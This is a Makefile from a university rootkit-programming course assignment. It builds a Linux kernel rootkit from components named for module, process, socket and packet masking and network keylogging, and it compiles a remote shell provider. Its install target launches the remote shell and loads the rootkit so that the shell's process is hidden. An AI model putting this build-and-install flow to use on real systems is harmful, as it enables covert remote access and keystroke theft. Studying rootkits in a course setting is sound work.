
###############################################################################
#                                                                             #
#   Course: Rootkit Programming                                               #
#   Semester: WS 2015/16                                                      #
#   Team: 105                                                                 #
#   Assignment: 10                                                            #
#                                                                             #
#   Filename: Makefile                                                        #
#                                                                             #
#   Authors:                                                                  #
#       Name: Matei Pavaluca                                                  #
#       Email: mateipavaluca@yahoo.com                                        #
#                                                                             #
#       Name: Nedko Stefanov Nedkov                                           #
#       Email: nedko.stefanov.nedkov@gmail.com                                #
#                                                                             #
#   Date: January 2016                                                        #
#                                                                             #
#   Usage: This Makefile compiles the module `rootkit.c`                      #
#                                                                             #
###############################################################################

OBJS = remote_shell_provider.o
REMOTE_SHELL_EXEC = ./remote_shell_provider
PP = gcc
FLAGS = -g -c

SYSMAP_SCRIPT = ./sysmap.sh
SYSMAP_HEADER = ./sysmap.h

KDIR = /lib/modules/$(shell uname -r)/build
TARGET = rootkit

obj-m += $(TARGET).o
rootkit-objs := module_masking.o network_keylogging.o process_masking.o socket_masking.o packet_masking.o conf_manager.o tcp_server.o jsmn.o core.o
ccflags-y = -Wno-unused-function

all:	$(OBJS) sysmap
	$(PP) -g $(OBJS) -o $(REMOTE_SHELL_EXEC)
	@echo "\nremote_shell_provider successfully compiled\n"
	make -C $(KDIR) M=$(PWD) modules
	@echo "\nRootkit successfully compiled\n"

clean:
	make -C $(KDIR) M=$(PWD) clean
	@echo "\nUseless files successfully deleted\n"

install:	all
	$(REMOTE_SHELL_EXEC) & insmod $(TARGET).ko pids="$$!"
	@echo "\nRootkit successfully installed\n"

uninstall:
	rmmod $(TARGET).ko
	make -C $(KDIR) M=$(PWD) clean
	@echo "\nRootkit successfully uninstalled\n"

remote_shell_provider.o:	remote_shell_provider.c
	$(PP) $(FLAGS) remote_shell_provider.c
	@echo "\nremote_shell_provider successfully compiled\n"

sysmap:
	$(SYSMAP_SCRIPT)
	@echo "\nSysmap header file successfully created\n"

